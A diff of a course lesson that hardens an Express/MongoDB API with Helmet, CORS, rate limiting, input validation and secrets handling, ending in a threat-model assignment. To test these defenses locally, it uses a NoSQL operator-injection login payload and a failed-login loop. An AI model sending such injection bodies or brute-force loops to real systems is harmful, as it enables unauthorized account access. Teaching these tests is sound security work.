+  if (err.type === 'entity.too.large') return res.status(413).json({ error: 'body too large' });
+  if (err.type === 'entity.parse.failed') return res.status(400).json({ error: 'body is not JSON' });
+  console.error(err.stack || err);
+  res.status(500).json({ error: 'server error' });
+});
+
+module.exports = { app };
 ```
 
----
+`api/server.js` connects and listens:
 
-### Runnable checkpoint: a small model
+```js
+const mongoose = require('mongoose');
+const config = require('./config');
+const { app } = require('./app');
 
-Predict the assertions before pressing Run. This model isolates one idea from the lesson; the manual walkthrough exercises the full environment. Change one input to violate the stated rule, observe the failure, then restore the valid case. Explain why the changed case should fail rather than editing the assertion to accept it.
+mongoose
+  .connect(config.mongoUri)
+  .then(() => {
+    app.listen(config.port, () => {
+      console.log('listening on ' + config.port);
+    });
+  })
+  .catch((err) => {
+    console.error('mongo connect failed: ' + err.message);
+    process.exit(1);
+  });
+```
+
+`api/.env` holds the four values. Generate the secret; do not type one.
+
+```dotenv
+PORT=3000
+MONGODB_URI=mongodb://127.0.0.1:27017/<capstone-name>
+JWT_SECRET=paste-the-output-of-openssl-rand-hex-32-here
+PAGE_ORIGIN=http://localhost:5173
+```
+
+Copy it to `api/.env.example` with the values blanked. Then start it from `api/`: `node --env-file=.env server.js`. The line is `listening on 3000`. Start it once more with `JWT_SECRET` commented out, and the line is `FATAL: missing environment variable JWT_SECRET`, and the prompt comes back, because the process exited. That is the fail-fast evidence. Put the secret back.
+
+Now the one worked example, the register boundary, with three curls. First the ordinary request with one extra key:
+
+```bash
+curl -i -H 'Content-Type: application/json' \
+  -d '{"name":"Bran","email":"Bran@Example.com","password":"correct horse","role":"admin"}' \
+  http://localhost:3000/api/register
+```
+
+The status is `201 Created`. The body has `id`, `name`, and `email`, with the email lowercased, and no `role`. The key was in the request and is absent from the document, and no line of code mentions `role`. That is `matchedData` doing the only thing it does.
+
+Second, the operator:
+
+```bash
+curl -i -H 'Content-Type: application/json' \
+  -d '{"email":{"$gt":""},"password":{"$gt":""}}' \
+  http://localhost:3000/api/login
+```
+
+The status is `400 Bad Request` with `{"error":"invalid input"}`. `rejectOperators` answered before the chain ran, and the chain's `isString()` would have answered if it had not. The handler never saw the body.
+
+Third, the headers. `curl -i http://localhost:3000/api/health` and read the top of the response: `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security`, and `RateLimit-Limit: 100` beside `RateLimit-Remaining`. Then the loop:
+
+```bash
+for i in $(seq 1 11); do
+  curl -s -o /dev/null -w '%{http_code}\n' -H 'Content-Type: application/json' \
+    -d '{"email":"bran@example.com","password":"wrong"}' http://localhost:3000/api/login
+done
+```
+
+Ten lines of `401`, then one `429`. The eleventh attempt in the window is refused before the database is asked anything. Wait fifteen minutes or restart the process to reset the counter; the counter is in memory, which is fine for one process and is a thing you will note in the threat model.
+
+The client is the hall's login screen with the capstone's names. `client/src/api.js` keeps the token and builds every request:
+
+```js
+export const apiBase = import.meta.env.VITE_API_BASE ?? 'http://localhost:3000';
+
+const KEY = 'capstoneToken';
+
+export function getToken() {
+  return sessionStorage.getItem(KEY) || '';
+}
+
+export function setToken(token) {
+  sessionStorage.setItem(KEY, token);
+}
+
+export function clearToken() {
+  sessionStorage.removeItem(KEY);
+}
+
+export async function api(path, options = {}) {
+  const headers = Object.assign({}, options.headers || {});
+  const token = getToken();
+  if (token) headers.Authorization = 'Bearer ' + token;
+  let body;
+  if (options.body !== undefined) {
+    headers['Content-Type'] = 'application/json';
+    body = JSON.stringify(options.body);
+  }
+  const response = await fetch(apiBase + path, { method: options.method || 'GET', headers, body });
+  const data = await response.json().catch(function () { return {}; });
+  return { ok: response.ok, status: response.status, data };
+}
+```
+
+`client/src/App.jsx` registers, logs in, and shows `/api/me`:
+
+```jsx
+import { useEffect, useState } from 'react';
+import { api, setToken, clearToken, getToken } from './api';
+
+export default function App() {
+  const [name, setName] = useState('');
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [me, setMe] = useState(null);
+  const [note, setNote] = useState('');
+
+  useEffect(function () {
+    if (!getToken()) return;
+    api('/api/me').then(function (r) { if (r.ok) setMe(r.data); else clearToken(); });
+  }, []);
+
+  async function register(event) {
+    event.preventDefault();
+    const r = await api('/api/register', { method: 'POST', body: { name, email, password } });
+    setNote(r.ok ? 'Registered. Now log in.' : (r.data.error || 'failed'));
+  }
+
+  async function login(event) {
+    event.preventDefault();
+    const r = await api('/api/login', { method: 'POST', body: { email, password } });
+    if (!r.ok) return setNote(r.data.error || 'failed');
+    setToken(r.data.token);
+    setMe({ id: r.data.id, name: r.data.name, email: r.data.email });
+    setNote('');
+  }
+
+  if (me) {
+    return (
+      <main>
+        <p>Signed in as {me.name} ({me.email})</p>
+        <button type="button" onClick={function () { clearToken(); setMe(null); }}>Sign out</button>
+      </main>
+    );
+  }
+
+  return (
+    <main>
+      <form onSubmit={login}>
+        <input value={name} onChange={function (e) { setName(e.target.value); }} aria-label="Name" placeholder="Name (register only)" />
+        <input value={email} onChange={function (e) { setEmail(e.target.value); }} aria-label="Email" placeholder="Email" />
+        <input type="password" value={password} onChange={function (e) { setPassword(e.target.value); }} aria-label="Password" placeholder="Password" />
+        <button type="submit">Log in</button>
+        <button type="button" onClick={register}>Register</button>
+      </form>
+      <p role="status">{note}</p>
+    </main>
+  );
+}
+```
+
+`cd client && npm run dev` in a second terminal prints `http://localhost:5173`, the origin the API's `.env` allows. Register Bran on the page, log in, and the page says `Signed in as Bran`. Open the network panel: the request to `/api/me` carries `Authorization: Bearer` and the URL carries nothing.
+
+Here is a small model you can run here. It models the trusted-shape step, the operator check, and the limiter's window. It proves those three rules can be stated and tested. It does not prove your API sends the headers or that your `.env` is ignored by git; those are the curls and the `git check-ignore` on your machine.
 
 ```js run=checkpoint-10-1
 function check(condition, message) {
   if (!condition) throw new Error(message);
   console.log('PASS:', message);
 }
-function profilePatch(body) {
-  if (typeof body.displayName !== 'string' || !body.displayName.trim()) return null;
-  return {displayName: body.displayName.trim()};
+
+const registerChains = {
+  name: function (v) { return typeof v === 'string' && v.trim().length >= 1 ? v.trim() : null; },
+  email: function (v) { return typeof v === 'string' && /^[^@\s]+@[^@\s]+$/.test(v.trim()) ? v.trim().toLowerCase() : null; },
+  password: function (v) { return typeof v === 'string' && v.length >= 8 ? v : null; }
+};
+
+function matchedData(body, chains) {
+  const shape = {};
+  const errors = [];
+  for (const field of Object.keys(chains)) {
+    const value = chains[field](body[field]);
+    if (value === null) errors.push(field);
+    else shape[field] = value;
+  }
+  return { shape: shape, errors: errors };
 }
-const patch = profilePatch({displayName: ' Ada ', role: 'admin'});
-check(patch.displayName === 'Ada', 'Allowed field normalized');
-check(!Object.hasOwn(patch, 'role'), 'Privilege field excluded');
+
+const proposal = { name: ' Bran ', email: 'Bran@Example.com', password: 'correct horse', role: 'admin' };
+const result = matchedData(proposal, registerChains);
+check(result.errors.length === 0 && result.shape.name === 'Bran' && result.shape.email === 'bran@example.com', 'Allowed field normalized');
+check(!Object.hasOwn(result.shape, 'role'), 'Privilege field excluded');
+
+const short = matchedData({ name: 'Ivo', email: 'ivo@example.com', password: 'short' }, registerChains);
+check(short.errors.length === 1 && short.errors[0] === 'password', 'a failing chain names the field');
+
+function hasOperatorKey(value) {
+  if (Array.isArray(value)) return value.some(hasOperatorKey);
+  if (value && typeof value === 'object') {
+    return Object.keys(value).some(function (key) {
+      return key.startsWith('$') || key.includes('.') || hasOperatorKey(value[key]);
+    });
+  }
+  return false;
+}
+check(hasOperatorKey({ email: { $gt: '' }, password: { $gt: '' } }) === true, 'an operator body is refused before the query');
+check(hasOperatorKey({ email: 'bran@example.com', password: 'correct horse' }) === false, 'a string body passes the operator check');
+
+function limiter(limit) {
+  const hits = new Map();
+  return function (key) {
+    const count = (hits.get(key) || 0) + 1;
+    hits.set(key, count);
+    return count > limit ? 429 : 200;
+  };
+}
+const login = limiter(10);
+const statuses = [];
+for (let i = 0; i < 11; i += 1) statuses.push(login('203.0.113.9'));
+check(statuses[9] === 200 && statuses[10] === 429, 'the eleventh attempt in the window is 429');
+check(login('198.51.100.4') === 200, 'another key has its own count');
+
 console.log('ok: checkpoint-10-1');
 ```
 
@@ -473,132 +556,78 @@ console.log('ok: checkpoint-10-1');
 
 ### Sanitization replaces authorization
 
-You escape HTML, validate the string, and still let any logged-in user delete any quest, because the route never checks who owns it. Sanitization changes what a string can do. Authorization decides who may do the operation. They fail differently and you need both. Call the route as a second user, with a well-formed id, and expect a refusal. If a clean payload from the wrong person succeeds, the sanitizer did its job and the boundary you meant to protect is open.
+You validated the string, you rejected the operator, and any logged-in user can still delete any record, because the route never checked who owns it. Sanitization changes what a value can do. Authorization decides who may do the operation. They fail in different ways and you need both. Log in as a second account, send a well-formed id that belongs to the first, and expect a refusal. If a clean payload from the wrong person succeeds, the chain did its job and the boundary you meant to protect is wide open. The fix is the filter the hall taught: `{ _id: req.params.id, owner: req.userId }`, so the query itself cannot find someone else's document.
 
 ### Secrets committed
 
-A key lands in a commit. Removing it in a later commit leaves it in history, and anyone who clones the repo has it. Rotate the secret first, so the leaked value stops working. Then purge the history or accept that the old value is public and must never be trusted again. Add the ignore rule that would have kept the file out, and check that the new key is only in the environment. A rotation you skip because you "deleted the file" is the incident still in progress.
+A key landed in a commit. You removed it in the next commit and feel fine. Anyone who clones the repo has the first commit. Rotate the secret first, so the leaked value stops working: a new `JWT_SECRET` logs everyone out, a new provider key is one click in the provider's dashboard. Then clean the history or accept that the old value is public forever. Add the ignore rule that would have kept the file out, confirm it with `git check-ignore api/.env`, and search history once: `git log --all -p | grep -n 'JWT_SECRET='` should print nothing but the example file's empty value. A rotation you skipped because you deleted the file is the incident still in progress.
 
 ### Audit fix breaks behavior
 
-You upgrade a dependency because an advisory said to, and a route starts rejecting a payload it used to accept. The advisory was real and so is the break. Read the changelog for the version you jumped, run the tests that cover the behavior you ship, and add a test for the case the upgrade changed. Pin the version you actually ran. An audit that goes green by applying every bump, with no test run, has traded a reported risk for an unknown one.
+`npm audit` named a package, you ran `npm audit fix`, and a route started rejecting a body it used to accept. The advisory was real and so is the break. Read the report before the fix: which package, which version range, whether the vulnerable path is one you call. Run `npm audit fix` without `--force`; the forced form will jump major versions on your behalf. Then run the tests from Unit 7, or if the capstone has none yet, the three curls from the demonstration, and commit the lockfile diff on its own so the change is one commit you can revert. An audit that goes green by applying every bump with no run afterwards has traded a reported risk for an unknown one.
 
 ## Your turn
 
-**Exercise 1: Validate Everything (90-110 min / 1:40-2:00)**
-- **Objective:** Add comprehensive input validation to an Express API
-- **Instructions:**
-  1. Take your capstone's registration and login routes (or use a provided starter Express app)
-  2. Add express-validator validation to:
-     - Registration: validate username (3-30 chars, alphanumeric), email (valid format), password (8+ chars, 1 uppercase, 1 number, 1 special char)
-     - Login: validate email format and password is not empty
-     - Any POST/PUT route that accepts user input
-  3. Add a reusable `validateRequest` middleware that checks for errors and returns a clean error response
-  4. Test with intentionally bad input (empty fields, script tags in the username, SQL injection strings)
-- **Success Criteria:**
-  - Bad input returns 400 with specific error messages per field
-  - Script tags are escaped or stripped
-  - Valid input passes through normally
-  - No route accepts unvalidated user input
+Build the barrier in `~/projects/<capstone-name>`. Everything below is on your machine; Mongo is on 27017 and nothing else is on 3000.
 
-**BREAK (110-115 min / 2:00-2:10)**
+1. Scaffold `api/` and `client/` with the commands from the demonstration. `npm init -y` in `api/` prints a `package.json` with no `"type"` line, which is CommonJS, the same as the hall. `git check-ignore api/.env` prints `api/.env` once the file exists.
+2. Copy the four pieces from `hall-api` into `api/models/user.js`, `api/middleware/require-user.js`, and `api/routes/auth.js`. Rename the audience to `capstone`. Add `api/config.js` with the required-variables loop. Starting with a missing `JWT_SECRET` prints `FATAL: missing environment variable JWT_SECRET` and exits.
+3. Write `api/app.js` in the order shown: Helmet, CORS, logger, the two limiters, `express.json({ limit: '10kb' })`, `rejectOperators`, routes, 404, error handler. `node --env-file=.env server.js` prints `listening on 3000`.
+4. Register with an extra `role` key. The status is `201` and the body has no `role`. Register the same email again: `409`.
+5. Send the `$gt` login body. The status is `400` and the body is `{"error":"invalid input"}`.
+6. Read the headers on `/api/health`. `X-Content-Type-Options: nosniff` and `RateLimit-Remaining` are both there. Run the eleven-login loop. Ten `401` lines and one `429`.
+7. Start the client, register and log in on the page, and confirm the network panel shows the bearer header on `/api/me` and no token in any URL.
+8. Run `npm audit` in `api/` and in `client/`. Read the report. Fix what has a fix without `--force`, rerun the three curls, and commit the lockfiles separately.
 
-**Exercise 2: Security Hardening Sprint (115-135 min / 2:10-2:40 -- overlaps with Demo section above)**
-- **Objective:** Apply security best practices to an existing Express app in 15 minutes
-- **Instructions:**
-  1. Install and configure Helmet.js (add `app.use(helmet())`)
-  2. Configure CORS to only allow your frontend origin
-  3. Add a general rate limiter (100 req/15 min)
-  4. Add a strict rate limiter on auth routes (5 req/15 min)
-  5. Verify all secrets are in .env and .env is in .gitignore
-  6. Add the config validation check (exit if required env vars are missing)
-  7. Run `npm audit` and note any vulnerabilities
-- **Success Criteria:**
-  - Helmet headers visible in browser DevTools (Network tab, check response headers)
-  - CORS rejects requests from unauthorized origins
-  - Rate limiter returns 429 after exceeding the limit (test with a loop)
-  - App crashes on startup if MONGODB_URI is missing from .env
-
----
+If step 3 fails with `Cannot find module 'express-rate-limit'`, you ran the install in the wrong folder. The API's dependencies live in `api/package.json`, not the repo root.
 
 ## The quest
 
-**Security Audit Lab (135-175 min / 2:40-2:55)**
-
-Work independently to apply everything from this session to your own capstone:
-
-1. **Audit your capstone** against the OWASP Top 10. Walk through each vulnerability category and check whether your application is exposed.
-2. **Add express-validator** to every route in your capstone that accepts user input. Do not skip any.
-3. **Install and configure** Helmet, CORS, and rate limiting if you have not already done so in the exercises.
-4. **Verify secrets management:** Confirm .env is in .gitignore, all secrets are externalized, and your config module validates required variables at startup.
-5. **Run `npm audit`** and fix any high or critical vulnerabilities with `npm audit # Review the report; update deliberately and rerun tests`.
-6. **Begin your SECURITY_AUDIT.md:** Create the file and start documenting PASS/FAIL status for each item (you will complete this as homework).
-
-Before you move on, read your own validation chain and the order of your middleware.
-
-**Recap + Homework Launch (175-180 min / 2:55-3:00)**
-- Recap: OWASP Top 10, input validation, secrets management, CORS, Helmet, rate limiting
-- You just leveled up your defense stat by about 500%
-- Next session: we turn code into cash with Stripe. Get your Stripe account ready.
-- Homework preview: security audit your capstone
-
----
-
-### Review the artifact
-
-Your deliverable is **A threat model, validated server boundaries, and a secrets-handling checklist**. Keep the result, the evidence, and the limitations together so a reviewer can reproduce the important behavior. Start the review with the user outcome, then trace the three boundaries shown in the working-model diagram. Explain what enters each boundary, what leaves it, and which condition would stop progress.
-
-Use the failure cases above as a rehearsal, not only as reading. Choose a valid fixture, change one relevant condition, and compare the result. Record expected and observed behavior separately. If they disagree, investigate the smallest boundary that could explain the difference. After correcting it, repeat the original valid case to check that the repair did not remove useful behavior.
-
-Ask a peer to review the artifact without your narration. Give them the setup instructions and acceptance criteria, then note where they need additional information. Improve the artifact or its instructions at that point. A complete submission is understandable without the author's memory. Include unresolved questions as explicit follow-up work with a reason and a next action; do not hide them behind a general claim that everything works.
-
 ![](diagram:session-10-1/fig3-evidence)
+
+Write `docs/threat-model.md` in the capstone repo. Copy this into the file and fill it in.
+
+```markdown
+# Threat model
+
+## Assets
+- (what the capstone must protect: records, hashes, secrets, later payment state)
+
+## Boundaries
+| Boundary | Ordinary request | Abuse request | Control | Evidence |
+|---|---|---|---|---|
+| POST /api/register body | | | | |
+| POST /api/login body | | | | |
+| Authorization header | | | | |
+
+## Secrets
+- Where each secret lives, who can read it, and what rotating it costs.
+
+## Known gaps
+- (controls that do not exist yet and the session that adds them)
+```
+
+A filled row looks like this:
+
+```markdown
+| POST /api/register body | name, email, password | extra role key, $gt operator | registerRules + matchedData, rejectOperators | 201 without role (curl, 2026-11-11); 400 on $gt |
+```
+
+The evidence column is the point. Each control points at a curl you ran, a header you read, or a command whose output you pasted. Commit `api/`, `client/`, `docs/threat-model.md`, and the two `.env.example` files. Leave both `.env` files out, and say in the Secrets section how you checked.
+
+- `docs/threat-model.md` with every boundary row filled and dated.
+- The four register and login statuses: 201, 409, 400, 401.
+- The header dump from `/api/health`.
+- The eleven-line loop output.
+- The `FATAL` line from a start without `JWT_SECRET`.
+- The `git check-ignore api/.env` output.
 
 ## Side quests
 
-Use these library pages to deepen the decisions in this lesson. Return to the main artifact and apply one idea rather than treating the references as a separate checklist.
+Broken access control is the diagnosis you cannot fix with a chain, injection is the one you just fixed with two, and the quick reference names the attacks you will meet in a code review before you meet them in a log.
 
 ## Before next session
 
-**Duration:** 180 minutes
-**Pre-work:** Completed Units 1-9 with a working Express/Node.js application and MongoDB. Familiarity with HTTP requests, middleware, REST APIs, and npm.
-**Materials:** express-validator, isomorphic-dompurify, helmet, cors, express-rate-limit, dotenv packages. OWASP Top 10 reference. Starter Express app, or the capstone you are already building.
+Next session the capstone takes money, in test mode, through a checkout page Stripe hosts, and a webhook that your server must verify before it believes. Create a Stripe account at [dashboard.stripe.com/register](https://dashboard.stripe.com/register) before you sit down; it asks for an email and nothing else to use test mode. Read the first page of the [webhooks guide](https://docs.stripe.com/webhooks) and notice the phrase about the raw body. That phrase is the reason next session's first edit to `app.js` goes above `express.json`.
 
----
-
-**Assignment: Security Audit Your Capstone**
-- **Objective:** Run a full security audit on your capstone application
-- **Tasks:**
-  1. Create a file called `SECURITY_AUDIT.md` in your capstone repo
-  2. Go through this checklist and document the status of each item (PASS, FAIL, or N/A):
-     - [ ] All secrets are in .env, not hardcoded
-     - [ ] .env is listed in .gitignore
-     - [ ] Passwords are hashed with bcrypt (salt rounds >= 10)
-     - [ ] All user input is validated on the server side
-     - [ ] HTML output is escaped or sanitized
-     - [ ] Helmet.js is installed and configured
-     - [ ] CORS is configured with a whitelist (not `*` in production)
-     - [ ] Rate limiting is in place on auth routes
-     - [ ] Rate limiting is in place on API routes
-     - [ ] `npm audit` reports zero high/critical vulnerabilities
-     - [ ] Error messages do not expose stack traces in production
-     - [ ] JWT tokens expire within a reasonable timeframe
-     - [ ] No sensitive data is held in memory (use HTTP-only cookies)
-  3. Fix any items that FAIL
-  4. Run `npm audit # Review the report; update deliberately and rerun tests` to patch known vulnerabilities
-  5. Commit the audit document and all security fixes
-- **Submission:** Push updated capstone repo with SECURITY_AUDIT.md and all fixes
-- **Time Estimate:** 2-3 hours
-- **Due:** Before Session 10.2
-
-**Stretch Goals (Optional):**
-- Research and implement Content Security Policy headers beyond Helmet defaults
-- Add a honeypot field to your registration form to catch bots
-- Implement account lockout after 5 failed login attempts (store attempt count in the database)
-
----
-
-### Manual verification and further reading
-
-- [Official reference 1](https://owasp.org/Top10/2025/)
-- [Official reference 2](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
+Nothing stays running between sessions. Stop the API and the Vite server with Ctrl-C. The capstone now has a barrier and a login, both committed, and `docs/threat-model.md` has a Known gaps section that says "webhook signature" and "paid feature" with next session's number beside them.
